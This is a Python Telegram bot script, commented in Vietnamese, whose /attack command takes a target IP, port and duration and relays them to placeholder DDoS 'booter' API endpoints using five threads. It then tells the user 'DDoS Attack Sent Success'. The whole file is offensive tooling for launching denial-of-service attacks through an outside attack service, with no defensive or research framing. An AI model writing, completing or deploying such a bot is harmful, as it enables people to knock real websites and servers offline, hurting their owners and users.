from telegram.ext import Updater, CommandHandler
import requests
import threading

# Hàm xử lý lệnh /start
def start(update, context):
    update.message.reply_text("Hello User, Use /attack to sent attack")

# Hàm gửi yêu cầu đến một URL
def send_request(url):
    requests.get(url)

# Hàm xử lý lệnh /ddos
def attack(update, context):
    # Lấy thông tin từ tin nhắn
    args = context.args
    if len(args) != 3:
        update.message.reply_text("Usage: /attack ip port time")
        return

    ip, port, time = args

    # Tạo URL cho request GET
    url1 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
    url2 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
    url3 = f"http://ip?ip={ip}&port={port}&thread=100&time={time}"
    url4 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"
    url5 = f"http://ip/?ip={ip}&port={port}&thread=100&time={time}"

    # Tạo và khởi chạy các luồng để gửi yêu cầu
    thread1 = threading.Thread(target=send_request, args=(url1,))
    thread2 = threading.Thread(target=send_request, args=(url2,))
    thread3 = threading.Thread(target=send_request, args=(url3,))
    thread4 = threading.Thread(target=send_request, args=(url4,))
    thread5 = threading.Thread(target=send_request, args=(url5,))
    thread1.start()
    thread2.start()
    thread3.start()
    thread4.start()
    thread5.start()

    print(f"Attack {ip}:{port} in {time} second")
    update.message.reply_text(f"DDoS Attack Sent Success To {ip}:{port} in {time} second")

# Hàm main
def main():
    # Khởi tạo Updater và Dispatcher
    updater = Updater("token_bot_tele", use_context=True)
    dp = updater.dispatcher

    # Thêm các xử lý lệnh cho bot
    dp.add_handler(CommandHandler("start", start))
    dp.add_handler(CommandHandler("attack", attack))

    # Bắt đầu lắng nghe tin nhắn từ Telegram
    updater.start_polling()
    updater.idle()

if __name__ == "__main__":
    main()
